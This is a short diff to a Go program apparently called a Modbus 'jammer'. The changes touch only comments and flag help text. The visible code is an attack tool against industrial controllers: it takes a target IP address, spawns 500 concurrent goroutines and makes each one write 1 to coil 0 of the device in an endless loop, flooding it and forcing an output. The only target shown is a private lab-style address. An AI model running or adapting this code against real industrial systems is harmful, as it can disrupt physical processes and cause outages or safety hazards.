@@ -19,14 +19,14 @@ var (
 )
 
 func init() {
-	flag.StringVar(&ip_address, "ip_address", "192.168.13.86", "The port on which to listen for connections") //Take in the ip address from the user
+	flag.StringVar(&ip_address, "ip_address", "192.168.13.86", "Enter IP address to target")
 	flag.IntVar(&runtime, "runtime", 1, "How long the program will run")
 }
 
 func jammer(target modbus.Client) {
 
 	for {
-		results, err := target.WriteSingleCoil(0, 0xFF00) //Writes a one? to coil 0 constantly
+		results, err := target.WriteSingleCoil(0, 0xFF00) //Writes a one to coil at position 0. 0xFF00 for 1 and 0x0000 for 0
 
 		if err != nil {
 			fmt.Println(err)
@@ -50,7 +50,7 @@ func main() {
 
 	client := modbus.NewClient(handler)
 
-	for i := 0; i < 500; i++ { //Generate 500 connections
+	for i := 0; i < 500; i++ { //Generate flood of connections
 		wait.Add(1)
 		go jammer(client)
 	}
